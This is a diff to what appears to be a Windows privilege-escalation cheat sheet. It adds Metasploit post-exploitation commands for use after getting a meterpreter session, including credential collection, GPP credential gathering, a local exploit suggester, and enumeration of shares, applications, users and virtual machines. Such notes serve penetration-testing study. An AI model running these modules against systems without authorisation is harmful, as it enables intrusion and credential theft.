@@ -163,18 +163,26 @@ So if you have a metasploit meterpreter session going you can run **getsystem**.
 First you need to background the meterpreter shell and then you just run the post modules.
 You can also try some different post modules. 
 
-**Find weak service permissions**
-
 ```
 use exploit/windows/local/service_permissions
-```
 
-```
 post/windows/gather/credentials/gpp
-```
 
-```
 exploit/windows/local/trusted_service_path
+
+run post/windows/gather/credential_collector 
+
+run post/multi/recon/local_exploit_suggester
+
+run post/windows/gather/enum_shares
+
+run post/windows/gather/enum_snmp
+
+run post/windows/gather/enum_applications
+
+run post/windows/gather/enum_logged_on_users
+
+run post/windows/gather/checkvm 
 ```
 
 
